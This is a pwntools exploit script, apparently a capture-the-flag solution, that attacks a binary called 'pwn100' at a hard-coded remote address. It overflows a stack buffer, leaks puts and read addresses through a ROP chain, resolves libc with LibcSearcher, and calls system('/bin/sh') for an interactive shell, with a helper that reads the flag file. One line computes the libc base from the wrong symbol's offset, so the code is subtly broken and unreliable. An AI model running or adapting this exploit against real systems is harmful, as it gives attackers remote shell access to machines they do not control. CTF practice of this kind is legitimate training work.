# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
from LibcSearcher import LibcSearcher
# context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './pwn100'
os.system('chmod +x %s'%binary)
elf = ELF(binary)
# libc = elf.libc
# libc = ELF('')
context.binary = binary
context.log_level = 'debug' 
DEBUG = 0
if DEBUG:
    libc = elf.libc
    context.log_level = 'debug' 
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm', binary,'-g','1234'])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = '111.200.241.244'
    port = '51585'
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
uu64= lambda a          : u64(p.recv(a).ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def getShell():
    sl('exec 1>&0')
    sl('echo shell')
    ru('shell')
    p.success('Get Shell')
    sl('cat flag')
    ru('flag')
    flag = rl()
    return ('flag' + flag)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def boom( pwn ):
    global p
    i = 0
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('>',num)

# one_gad = one_gadget(libc.path)

def attack():
    
    main_addr = 0x40068E
    puts_plt = elf.plt['puts']
    puts_got = elf.got['puts']
    read_got = elf.got['read']
    pop_rdi_ret = elf.search(asm('pop rdi;ret')).next()

    payload = 'a'*0x40 + 'b'*0x8 + flat( pop_rdi_ret , puts_got , puts_plt ,main_addr)
    se(payload.ljust( 0xc8,'\x00'))
    puts_addr = l64()
    lg('puts_addr',puts_addr)

    payload = 'a'*0x40 + 'b'*0x8 + flat( pop_rdi_ret , puts_got , puts_plt ,main_addr)
    se(payload.ljust( 0xc8,'\x00'))
    read_addr = l64()
    lg('read_addr',read_addr)


    libc = LibcSearcher( 'puts' , puts_addr)
    libc.add_condition( 'read' , read_addr)
    libc_base =  puts_addr - libc.dump('read')

    system_addr = libc.dump('system') + libc_base
    binsh_addr = libc.dump("str_bin_sh") +libc_base

    payload = 'a'*0x40 + 'b'*0x8 + flat( pop_rdi_ret , binsh_addr ,system_addr)

    se(payload.ljust( 0xc8,'\x00'))
    
    # p.success(getShell())
    p.interactive()

attack()

'''
@File    :   pwn100.py
@Time    :   2021/11/30 13:47:27
@Author  :   Niyah 
'''